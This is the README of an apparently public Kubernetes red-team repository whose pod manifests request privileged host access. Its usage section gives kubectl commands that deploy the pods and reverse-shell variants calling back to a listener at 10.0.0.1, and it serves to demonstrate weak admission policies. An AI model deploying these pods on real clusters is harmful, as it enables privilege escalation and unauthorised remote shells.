# badPods

A collection of manifests that create pods with different elevated privileges. Quickly demonstrate the impact of allowing specific security sensitive pod specifications. 

## Background
Occasionally pods need access to privileged resources on the host, so the Kubernetes pod spec allows for it. However, this level of access should be granted with extreme caution. Administrators have ways to prevent the creation of pods with these security sensitive pod specifications using Pod Security Policies or with admission controllers like OPA Gatekeeper. However, the real-world security implication of allowing a certain attributes is not always understood, and quite often, pod creation polices are not as locked down as they should be. 

## Purpose
What if you can create a pod with just `hostNetwork`, just `hostPID`, just `hostIPC`, just `hostPath`, or just `privileged`? What can you do in each case? This respository aims to help you answer those questions. 

## Prerequisites
In order to be successful in this attack path, you'll need the following: 

1. Access to a cluster 
1. Permission to create pods in at least one namespace. If you can exec into them that makes life easier.  
1. A pod security policy (or other pod admission controller's logic) that allows pods to be created with one or more security sensitive attributes, or no pod security policy / pod admission controller at all

## The badPods line-up
In most situations, if you have permission to create pods, you also have permission to `exec` into them. However, that is not always the case so a version of each pod is included that will call back to your listener as soon as the pod is created. 

Notes | readme | pod | revshell
-- | -- | -- | --
Everything allowed | [readme](yaml/everything-allowed/) | [yaml](yaml/everything-allowed/pod-everything-allowed.yaml) | [yaml](yaml/everything-allowed/pod-everything-allowed-revshell.yaml)
Privileged and hostPid | [readme](yaml/priv-and-hostpid/) | [yaml](yaml/priv-and-hostpid/pod-priv-and-hostpid.yaml) | [yaml](yaml/priv-and-hostpid/pod-priv-and-hostpid-revshell.yaml)
Privileged only | [readme](yaml/priv/) | [yaml](yaml/priv/pod-priv.yaml) | [yaml](yaml/priv/pod-priv-revshell.yaml)
hostPid only | [readme](yaml/hostpid/) | [yaml](yaml/hostpid/pod-hostpid.yaml) | [yaml](yaml/hostpid/pod-hostpid-revshell.yaml)  
hostNetwork only | [readme](yaml/hostnetwork/) | [yaml](yaml/hostnetwork/pod-hostnetwork.yaml) | [yaml](yaml/hostnetwork/pod-hostnetwork-revshell.yaml)
hostIPC only | [readme](yaml/hostipc/) | [yaml](yaml/hostipc/pod-hostipc.yaml) | [yaml](yaml/hostipc/pod-hostipc-revshell.yaml)
Nothing allowed | [readme](yaml/nothing-allowed/) | [yaml](yaml/nothing-allowed/pod-nothing-allowed.yaml) | [yaml](yaml/nothing-allowed/pod-nothing-allowed-revshell.yaml)


# Impact - What's the worst that can happen?
Check out blog post here

# Usage
 Each resource in the `yamls` directory targets a specific attribute or a combination of attributes that expose the cluster to risk when allowed. Each subdirectory has it's own usage information which includes tailored post-exploitation ideas and steps.  

### Clone the repo
```bash
git clone https://github.com/BishopFox/badPods
cd badPods
```

### Create the pods (or at least try to create them)

```bash
kubectl apply -f ./yaml/everything-allowed/pod-everything-allowed.yaml
kubectl apply -f ./yaml/priv-and-hostpid/pod-priv-and-hostpid.yaml 
kubectl apply -f ./yaml/priv/pod-priv.yaml
kubectl apply -f ./yaml/hostpath/pod-hostpath.yaml
kubectl apply -f ./yaml/hostpid/pod-hostpid.yaml 
kubectl apply -f ./yaml/hostnetwork/pod-hostnetwork.yaml
kubectl apply -f ./yaml/hostipc/pod-hostipc.yaml
kubectl apply -f ./yaml/nothing-allowed/pod-nothing-allowed.yaml

```

### Reverse shell version of each pod
If you can create pods but not exec  into them, you can use the reverse shell version of each pod. To avoid having to edit each pod with your host and port, you can environment variables and the `envsubst` command. Remember to spin up all of your listeners first!

```bash
HOST="10.0.0.1" PORT="3111" envsubst < ./yaml/priv-and-hostpid/pod-priv-and-hostpid-revshell.yaml | kubectl apply -f -
HOST="10.0.0.1" PORT="3112" envsubst < ./yaml/hostpid/pod-hostpid-revshell.yaml  | kubectl apply -f -
HOST="10.0.0.1" PORT="3113" envsubst < ./yaml/hostnetwork/pod-hostnetwork-revshell.yaml | kubectl apply -f -
HOST="10.0.0.1" PORT="3114" envsubst < ./yaml/hostpath/pod-hostpath-revshell.yaml | kubectl apply -f -
HOST="10.0.0.1" PORT="3115" envsubst < ./yaml/hostipc/pod-hostipc-revshell.yaml | kubectl apply -f -
HOST="10.0.0.1" PORT="3116" envsubst < ./yaml/everything-allowed/pod-everything-allowed-revshell.yaml | kubectl apply -f -
HOST="10.0.0.1" PORT="3116" envsubst < ./yaml/nothing-allowed/pod-nothing-allowed-revshell.yaml | kubectl apply -f -
```

# Acknowledgements 
Thank you [Rory McCune](https://twitter.com/raesene), [Duffie Cooley](https://twitter.com/mauilion), [Brad Geesaman](https://twitter.com/bradgeesaman), [Tabitha Sable](https://twitter.com/tabbysable), [Ian Coldwater](https://twitter.com/IanColdwater), and [Mark Manning](https://twitter.com/antitree) for publicly sharing so much knowledge about Kubernetes offensive security. 
